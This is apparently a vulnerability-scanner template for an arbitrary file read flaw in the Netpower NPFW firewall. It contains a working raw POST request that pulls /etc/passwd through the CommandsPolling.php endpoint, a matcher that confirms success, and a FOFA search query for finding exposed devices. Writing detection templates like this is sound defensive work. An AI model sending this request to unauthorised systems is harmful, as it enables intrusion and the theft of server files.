http:
- matchers:
  - regex:
    - 'root:.*:0:0:'
    type: regex
  - condition: and
    part: body
    type: word
    words:
    - '{"type":"event"'
    - dealing
  - status:
    - 200
    type: status
  matchers-condition: and
  raw:
  - 'POST /direct/polling/CommandsPolling.php HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded


    command=ping&filename=%2Fetc%2Fpasswd&cmdParam=

    '
id: netpower-npfw-lfi
info:
  author: ritikchaddha
  description: 'Netpower NPFW firewall has an arbitrary file read vulnerability. Due
    to insufficient code filtering, it can read any file on the server

    '
  metadata:
    fofa-query: '"Netpower" && "/direct"'
    max-request: 1
  name: Netpower NPFW - Local File Inclusion
  reference: '- https://forum.butian.net/article/241

    '
  severity: high
  tags: netpower,npfw,lfi
